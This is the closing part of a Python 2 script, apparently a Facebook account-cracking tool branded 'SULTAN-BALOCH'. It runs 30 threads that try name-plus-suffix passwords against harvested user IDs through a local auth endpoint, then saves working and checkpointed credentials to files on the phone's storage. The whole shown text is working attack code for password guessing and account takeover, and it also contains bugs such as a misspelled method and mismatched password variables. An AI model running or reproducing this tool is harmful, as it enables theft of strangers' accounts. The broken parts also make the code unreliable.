                    print '\x1b[1;34m(\x1b[1;31mSULTAN\x1b[1;33m-\x1b[1;32mBALOCH\x1b[1;33m-\x1b[105m\x1b[37;1mOK\x1b[0m\x1b[1;34m) ' + uid + ' | ' + pass2 + '\x1b[1;93m'
                    ok = open('/sdcard/ids/paid1000-ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;31m(\x1b[1;32mSULTAN\x1b[1;33m-\x1b[1;36mBALOCH\x1b[1;34m-\x1b[102m\x1b[37;1mCP\x1b[0m\x1b[1;31m) ' + uid + ' | ' + pass2 + '\x1b[1;92m'
                    cp = open('/sdcard/ids/paid1000-cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name + p3
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;34m(\x1b[1;31mSULTAN\x1b[1;33m-\x1b[1;32mBALOCH\x1b[1;33m-\x1b[105m\x1b[37;1mOK\x1b[0m\x1b[1;34m) ' + uid + ' | ' + pass3 + '\x1b[1;93m'
                        ok = open('/sdcard/ids/paid1000-ok.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;31m(\x1b[1;32mSULTAN\x1b[1;33m-\x1b[1;36mBALOCH\x1b[1;34m-\x1b[102m\x1b[37;1mCP\x1b[0m\x1b[1;31m) ' + uid + ' | ' + pass3 + '\x1b[1;92m'
                        cp = open('/sdcard/ids/paid1000-cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name + p4
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;34m(\x1b[1;31mSULTAN\x1b[1;33m-\x1b[1;32mBALOCH\x1b[1;33m-\x1b[105m\x1b[37;1mOK\x1b[0m\x1b[1;34m) ' + uid + ' | ' + pass4 + '\x1b[1;93m'
                            ok = open('/sdcard/ids/paid1000-ok.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;31m(\x1b[1;32mSULTAN\x1b[1;33m-\x1b[1;36mBALOCH\x1b[1;34m-\x1b[102m\x1b[37;1mCP\x1b[0m\x1b[1;31m) ' + uid + ' | ' + pass4 + '\x1b[1;92m'
                            cp = open('/sdcard/ids/paid1000-cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
                        else:
                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;34m(\x1b[1;31mSULTAN\x1b[1;33m-\x1b[1;32mBALOCH\x1b[1;33m-\x1b[105m\x1b[37;1mOK\x1b[0m\x1b[1;34m) ' + uid + ' | ' + pass5 + '\x1b[1;93m'
                                ok = open('/sdcard/ids/paid1000-ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[1;31m(\x1b[1;32mSULTAN\x1b[1;33m-\x1b[1;36mBALOCH\x1b[1;34m-\x1b[102m\x1b[37;1mCP\x1b[0m\x1b[1;31m) ' + uid + ' | ' + pass5 + '\x1b[1;92m'
                                cp = open('/sdcard/ids/paid1000-cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.append(uid + pass6)
                            else:
                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;34m(\x1b[1;31mSULTAN\x1b[1;33m-\x1b[1;32mBALOCH\x1b[1;33m-\x1b[105m\x1b[37;1mOK\x1b[0m\x1b[1;34m) ' + uid + ' | ' + pass6 + '\x1b[1;93m'
                                    ok = open('/sdcard/ids/paid1000-ok.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;31m(\x1b[1;32mSULTAN\x1b[1;33m-\x1b[1;36mBALOCH\x1b[1;34m-\x1b[102m\x1b[37;1mCP\x1b[0m\x1b[1;31m) ' + uid + ' | ' + pass6 + '\x1b[1;92m'
                                    cp = open('/sdcard/ids/paid1000-cp.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.append(uid + pass6)
                                else:
                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\x1b[1;34m(\x1b[1;31mSULTAN\x1b[1;33m-\x1b[1;32mBALOCH\x1b[1;33m-\x1b[105m\x1b[37;1mOK\x1b[0m\x1b[1;34m) ' + uid + ' | ' + pass7 + '\x1b[1;93m'
                                        ok = open('/sdcard/ids/paid1000-ok.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\x1b[1;31m(\x1b[1;32mSULTAN\x1b[1;33m-\x1b[1;36mBALOCH\x1b[1;34m-\x1b[102m\x1b[37;1mCP\x1b[0m\x1b[1;31m) ' + uid + ' | ' + pass7 + '\x1b[1;92m'
                                        cp = open('/sdcard/ids/paid1000-cp.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        cps.append(uid + pass7)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print ''
    print 47 * '-'
    print ''
    print ' \x1b[0;32mThe process has completed'
    print ' \x1b[0;35mManual Password Result'
    print ' \x1b[0;36mRESULT :\x1b[0;33m TOTAL SULTAN-BALOCH OK : ' + str(len(oks)) + ' \x1b[0;32mTOTAL Meer-Sultan CP : ' + str(len(cps))
    print ''
    print 47 * '-'
    print ''
    raw_input(' Press enter to back')
    choice()


if __name__ == '__main__':
    reg()
